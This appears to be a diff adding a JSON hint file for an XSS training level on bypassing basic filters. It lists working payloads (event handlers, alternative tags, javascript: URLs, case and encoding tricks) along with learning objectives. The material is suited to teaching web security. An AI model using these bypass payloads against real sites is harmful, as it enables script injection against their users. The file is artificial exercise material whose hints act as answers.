@@ -1,0 +1,118 @@
+{
+  "level": 4,
+  "category": "xss",
+  "title": "XSS with Basic Filters",
+  "hints": [
+    {
+      "order": 1,
+      "title": "Understanding XSS Filters",
+      "content": "This level implements basic XSS filtering that blocks common attack vectors like <script> tags. The application removes or blocks these dangerous elements, but the filtering is not comprehensive. Your goal is to find alternative XSS vectors that bypass these basic protections.",
+      "type": "text",
+      "difficulty": 1,
+      "unlock_after_attempts": 0,
+      "points_cost": 0,
+      "tags": ["concept", "filtering", "bypass"]
+    },
+    {
+      "order": 2,
+      "title": "Event Handler Injection",
+      "content": "Since <script> tags are blocked, try using HTML event handlers instead. These work without script tags: <img src=x onerror=alert('XSS')>, <body onload=alert('XSS')>, <div onmouseover=alert('XSS')>",
+      "type": "code",
+      "difficulty": 2,
+      "unlock_after_attempts": 2,
+      "points_cost": 8,
+      "tags": ["event-handlers", "img", "onerror", "onload"]
+    },
+    {
+      "order": 3,
+      "title": "Alternative HTML Tags",
+      "content": "Try XSS vectors using different HTML elements that might not be filtered: <iframe onload=alert('XSS')>, <svg onload=alert('XSS')>, <details ontoggle=alert('XSS')>, <video oncanplay=alert('XSS')>",
+      "type": "code",
+      "difficulty": 3,
+      "unlock_after_attempts": 4,
+      "points_cost": 12,
+      "tags": ["iframe", "svg", "details", "video", "alternative-tags"]
+    },
+    {
+      "order": 4,
+      "title": "JavaScript Protocol",
+      "content": "Sometimes javascript: protocol works in certain contexts. Try: <a href='javascript:alert(\"XSS\")'>Click</a> or <iframe src='javascript:alert(\"XSS\")'></iframe>",
+      "type": "technique",
+      "difficulty": 3,
+      "unlock_after_attempts": 5,
+      "points_cost": 15,
+      "tags": ["javascript-protocol", "href", "src"]
+    },
+    {
+      "order": 5,
+      "title": "Case Sensitivity Bypass",
+      "content": "Basic filters might be case-sensitive. Try variations like: <ScRiPt>alert('XSS')</ScRiPt>, <IMG SRC=x ONERROR=alert('XSS')>, or mixing upper and lower case in your payloads.",
+      "type": "technique",
+      "difficulty": 2,
+      "unlock_after_attempts": 3,
+      "points_cost": 10,
+      "tags": ["case-bypass", "mixed-case", "filter-evasion"]
+    },
+    {
+      "order": 6,
+      "title": "Filter Testing Strategy",
+      "content": "Test what gets filtered by submitting simple inputs: 1) Try '<script>' to confirm it's blocked, 2) Try '<img>' to see if it passes, 3) Try 'onerror' to check event handler filtering, 4) Combine allowed elements with allowed event handlers.",
+      "type": "strategy",
+      "difficulty": 2,
+      "unlock_after_attempts": 1,
+      "points_cost": 5,
+      "tags": ["testing", "methodology", "reconnaissance"]
+    },
+    {
+      "order": 7,
+      "title": "Form-based Injection",
+      "content": "This level uses a POST form. Make sure your payload is in the correct form field. The filtered input will be displayed, so look for where your modified input appears on the page after filtering.",
+      "type": "technical",
+      "difficulty": 2,
+      "unlock_after_attempts": 1,
+      "points_cost": 6,
+      "tags": ["form", "post", "input-reflection"]
+    },
+    {
+      "order": 8,
+      "title": "Payload Encoding",
+      "content": "Sometimes URL encoding or HTML entity encoding can bypass simple filters: %3Cscript%3E for <script>, &#60;script&#62; for <script>, or try double encoding: %253Cscript%253E",
+      "type": "advanced",
+      "difficulty": 4,
+      "unlock_after_attempts": 7,
+      "points_cost": 20,
+      "tags": ["encoding", "url-encoding", "html-entities", "double-encoding"]
+    }
+  ],
+  "filter_analysis": {
+    "blocked_patterns": [
+      "<script>",
+      "</script>",
+      "javascript:"
+    ],
+    "bypass_techniques": [
+      "Use event handlers instead of script tags",
+      "Try alternative HTML elements",
+      "Test case sensitivity variations",
+      "Use encoding techniques"
+    ]
+  },
+  "common_mistakes": [
+    "Continuing to use <script> tags even after seeing they're blocked",
+    "Not testing the actual filter behavior before crafting bypass payloads",
+    "Forgetting that event handlers need proper HTML context to execute",
+    "Not checking if the payload actually gets reflected in the output"
+  ],
+  "learning_objectives": [
+    "Understand how basic XSS filters work and their limitations",
+    "Learn alternative XSS vectors that don't rely on script tags",
+    "Practice systematic filter testing and bypass methodology",
+    "Develop skills in crafting context-appropriate XSS payloads"
+  ],
+  "real_world_context": {
+    "scenario": "Legacy Application with Basic Protection",
+    "description": "Many older web applications implement simple blacklist-based XSS protection that only blocks the most obvious attack vectors like <script> tags. However, HTML supports many other ways to execute JavaScript through event handlers and alternative elements.",
+    "impact": "Even with basic filtering in place, applications remain vulnerable to XSS attacks using alternative vectors, highlighting the inadequacy of blacklist-based security approaches.",
+    "modern_relevance": "While modern frameworks provide better XSS protection, understanding filter bypass techniques is crucial for security testing and penetration testing of legacy systems."
+  }
+}
